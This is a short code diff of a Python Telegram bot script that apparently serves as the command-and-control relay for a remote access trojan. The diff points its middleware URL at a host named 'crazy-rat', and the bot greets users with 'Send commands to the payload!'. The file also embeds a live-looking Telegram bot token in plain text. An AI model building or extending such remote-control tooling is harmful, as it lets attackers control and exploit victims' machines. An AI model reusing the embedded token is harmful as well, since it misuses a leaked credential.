@@ -3,7 +3,7 @@ import requests
 
 # Telegram Bot Token
 TELEGRAM_BOT_TOKEN = "7557926778:AAH74UZc7JB5KSa0tJWRjqlBDlFDeEruog8"
-MIDDLEWARE_URL = "https://your-render-app.onrender.com/command"
+MIDDLEWARE_URL = "https://crazy-rat.onrender.com"
 
 def start(update, context):
     update.message.reply_text("Connected to the middleware. Send commands to the payload!")
